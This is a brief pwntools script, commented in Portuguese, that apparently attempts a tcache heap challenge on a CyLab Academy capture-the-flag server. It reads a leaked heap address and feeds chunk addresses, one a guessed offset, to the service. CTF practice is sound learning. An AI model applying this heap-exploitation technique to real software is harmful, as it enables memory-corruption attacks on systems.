from pwn import *

context.log_level = 'info'
p = remote('xebec.cylabacademy.net', 26745)

# Lê o head inicial
line = p.recvline_contains(b'tcache head')
head_str = line.split(b'-> ')[1].strip()
head_val = int(head_str, 16)
print(f"Head: {hex(head_val)}")

def send_chunk(prompt, addr):
    val = hex(addr).encode()
    print(f"Enviando {prompt.decode()} {val.decode()}")
    p.sendlineafter(prompt, val)

# Chunk 1 é o head
send_chunk(b'Chunk 1 address: ', head_val)

# Teste com o próximo chunk (ex: +0x90 ou o offset correto)
chunk2 = head_val + 0x90
send_chunk(b'Chunk 2 address: ', chunk2)

p.interactive()